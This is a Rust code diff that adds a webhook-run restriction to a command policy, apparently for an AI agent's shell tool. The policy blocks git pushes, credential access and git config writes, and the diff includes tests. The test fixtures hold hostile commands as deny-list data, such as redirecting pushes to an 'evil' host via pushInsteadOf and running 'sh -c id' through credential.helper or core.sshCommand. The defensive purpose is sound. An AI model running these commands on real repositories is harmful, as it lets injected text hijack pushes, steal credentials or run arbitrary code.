@@ -43,6 +43,7 @@ pub struct CommandPolicy {
     allow_dangerous: bool,
     settings_file: Option<SettingsFile>,
     ask_self_commands: bool,
+    webhook: bool,
 }
 
 /// How deep `sh -c`, `eval` and `$(...)` may nest before a command is refused.
@@ -142,6 +143,18 @@ impl CommandPolicy {
     /// them first. Without it they are refused.
     pub fn ask_self_commands(mut self, ask: bool) -> Self {
         self.ask_self_commands = ask;
+        self
+    }
+
+    /// For a run a webhook started (anyone's text): also refuses the git
+    /// commands that publish commits (`git push` in every form, `git
+    /// send-pack`, `git subtree push`), change git's configuration (`git
+    /// config` other than reading it: `url.*.pushInsteadOf` would redirect
+    /// the flow's own push), reach git credentials (`git credential`,
+    /// `git-credential-*`) or define aliases on the command line (`git -c
+    /// alias.p=push p`), even with [`CommandPolicy::allow_dangerous`].
+    pub fn webhook_run(mut self, webhook: bool) -> Self {
+        self.webhook = webhook;
         self
     }
 
@@ -392,6 +405,11 @@ impl CommandPolicy {
         {
             return Some(write.refusal());
         }
+        if self.webhook
+            && let Some(reason) = webhook_git_violation(name, args)
+        {
+            return Some(reason);
+        }
 
         if SHELLS.contains(&name)
             && let Some(script) = shell_script(args)
@@ -454,6 +472,7 @@ impl CommandPolicy {
             .allow_dangerous(settings.allow_dangerous)
             .protect_settings_file(settings.settings_file.clone())
             .ask_self_commands(settings.approval_gate)
+            .webhook_run(settings.webhook)
     }
 
     /// Why a person should look at `command` before it runs, if at all:
@@ -1248,6 +1267,124 @@ fn git_force_push(args: &[String]) -> Option<String> {
             || (arg.starts_with('+') && arg.len() > 1)
     })
     .then(|| "force push (use --force-with-lease instead)".into())
+}
+
+/// Why a webhook run may not run `git` (as `name`, or a `git-*` program)
+/// with `args`, if it may not ([`CommandPolicy::webhook_run`]).
+fn webhook_git_violation(name: &str, args: &[String]) -> Option<String> {
+    const WHY: &str = "this run was started by a webhook, whose text anyone can write";
+    if matches!(name, "git-send-pack" | "git-push" | "git-receive-pack")
+        || name.starts_with("git-credential")
+    {
+        return Some(format!(
+            "`{name}` is not allowed: {WHY}; the flow pushes by itself"
+        ));
+    }
+    if name != "git" {
+        return None;
+    }
+    let mut i = 0;
+    let mut subcommand = None;
+    while let Some(arg) = args.get(i) {
+        i += 1;
+        let value = match arg.as_str() {
+            "-C" | "-c" | "--git-dir" | "--work-tree" | "--namespace" | "--config-env"
+            | "--super-prefix" => {
+                i += 1;
+                args.get(i - 1).map(String::as_str)
+            }
+            _ if arg.starts_with("--config-env=") => arg.split_once('=').map(|(_, value)| value),
+            _ if arg.starts_with('-') => None,
+            _ => {
+                subcommand = Some(arg.as_str());
+                break;
+            }
+        };
+        if matches!(arg.as_str(), "-c" | "--config-env") || arg.starts_with("--config-env=") {
+            let key = value.unwrap_or_default().to_ascii_lowercase();
+            if key.starts_with("alias.") || key.starts_with("credential") || key.starts_with("url.")
+            {
+                return Some(format!(
+                    "`git {arg} {}` is not allowed: {WHY}",
+                    value.unwrap_or_default()
+                ));
+            }
+        }
+    }
+    let rest = &args[i.min(args.len())..];
+    match subcommand? {
+        "push" | "send-pack" => Some(format!(
+            "`git {}` is not allowed: {WHY}; the flow pushes by itself after this step",
+            subcommand.unwrap_or_default()
+        )),
+        "subtree" if rest.iter().any(|arg| arg == "push") => Some(format!(
+            "`git subtree push` is not allowed: {WHY}; the flow pushes by itself"
+        )),
+        sub if sub.starts_with("credential") => Some(format!(
+            "`git {sub}` is not allowed: {WHY}; it reaches the user's git credentials"
+        )),
+        "config" if !git_config_reads(rest) => Some(format!(
+            "`git config` may only read here (--get, --list, `git config get`): {WHY}, and \
+             the repository's configuration decides where the flow's own push goes"
+        )),
+        _ => None,
+    }
+}
+
+/// Whether `git config` with `args` only reads.
+fn git_config_reads(args: &[String]) -> bool {
+    const WRITES: &[&str] = &[
+        "--add",
+        "--unset",
+        "--unset-all",
+        "--replace-all",
+        "--rename-section",
+        "--remove-section",
+        "-e",
+        "--edit",
+    ];
+    const READS: &[&str] = &[
+        "--get",
+        "--get-all",
+        "--get-regexp",
+        "--get-urlmatch",
+        "--get-color",
+        "--get-colorbool",
+        "-l",
+        "--list",
+    ];
+    // Options whose value is the next word.
+    const TAKES_VALUE: &[&str] = &[
+        "-f",
+        "--file",
+        "--blob",
+        "--type",
+        "--default",
+        "--comment",
+        "--value",
+        "--url",
+    ];
+    if args.iter().any(|arg| WRITES.contains(&arg.as_str())) {
+        return false;
+    }
+    if args.iter().any(|arg| READS.contains(&arg.as_str())) {
+        return true;
+    }
+    let mut operands = Vec::new();
+    let mut words = args.iter();
+    while let Some(arg) = words.next() {
+        if TAKES_VALUE.contains(&arg.as_str()) {
+            words.next();
+        } else if !arg.starts_with('-') {
+            operands.push(arg.as_str());
+        }
+    }
+    match operands.first() {
+        Some(&"get" | &"list") => true,
+        Some(&"set" | &"unset" | &"rename-section" | &"remove-section" | &"edit") => false,
+        // `git config <name>` reads, `git config <name> <value>` writes.
+        _ => operands.len() <= 1,
+    }
 }
 
 /// The script of `sh -c 'script'`, also with combined flags like `-ec`.
@@ -2088,6 +2225,81 @@ mod tests {
         allowed("git push --follow-tags");
         allowed("git commit -m 'git push --force'");
         allowed("git log -f");
+    }
+
+    #[test]
+    fn webhook_runs_may_not_push_or_change_git_config() {
+        let policy = CommandPolicy::with_settings(&ToolSettings {
+            webhook: true,
+            ..ToolSettings::default()
+        });
+        for command in [
+            "git push origin HEAD:main",
+            "git push",
+            "git -C x push origin FETCH_HEAD:main",
+            "git --git-dir=.git push o main",
+            "git -c core.quotepath=off push",
+            "git fetch origin pull/1/head && git push origin FETCH_HEAD:main",
+            "cd sub; /usr/bin/git push",
+            "env GIT_TRACE=1 git push",
+            "sh -c 'git push origin main'",
+            "eval git push",
+            "git send-pack https://x/o/n.git main",
+            "git-send-pack x main",
+            "git subtree push --prefix=lib origin main",
+            "git -c alias.p=push p origin main",
+            "git --config-env=alias.p=P p",
+            "git -c credential.helper=store fetch",
+            "git -c url.https://evil/.pushInsteadOf=https://github.com/ fetch",
+            "git credential fill",
+            "git credential-store get",
+            "git-credential-store get",
+            "git config url.https://evil/.pushInsteadOf https://github.com/",
+            "git config --add credential.helper '!sh -c id'",
+            "git config set core.sshCommand 'sh -c id'",
+            "git config --unset remote.origin.pushurl",
+            "git config -e",
+            "git -C .junees-worktrees/pr-7 config --local core.hooksPath /tmp/h",
+        ] {
+            match policy.check(command) {
+                Verdict::Deny(reason) => assert!(
+                    reason.contains("started by a webhook"),
+                    "{command}: {reason}"
+                ),
+                Verdict::Allow => panic!("expected `{command}` to be denied"),
+            }
+        }
+        for command in [
+            "git status",
+            "git diff HEAD~1",
+            "git log --grep push",
+            "git fetch origin",
+            "git commit -m 'push it'",
+            "echo git push",
+            "git config --get remote.origin.url",
+            "git config --list --show-origin",
+            "git config -l",
+            "git config user.name",
+            "git config get user.email",
+            "git -c color.ui=never log",
+        ] {
+            assert_eq!(policy.check(command), Verdict::Allow, "{command}");
+        }
+        // Even with the built-in rules off.
+        let open = CommandPolicy::with_settings(&ToolSettings {
+            webhook: true,
+            allow_dangerous: true,
+            ..ToolSettings::default()
+        });
+        assert!(matches!(
+            open.check("git push origin HEAD:main"),
+            Verdict::Deny(_)
+        ));
+        // Other runs keep `git push` (a caution, asked about when a gate
+        // exists).
+        let plain = CommandPolicy::with_settings(&ToolSettings::default());
+        assert_eq!(plain.check("git push origin HEAD:main"), Verdict::Allow);
+        assert_eq!(plain.check("git config user.name x"), Verdict::Allow);
     }
 
     #[test]
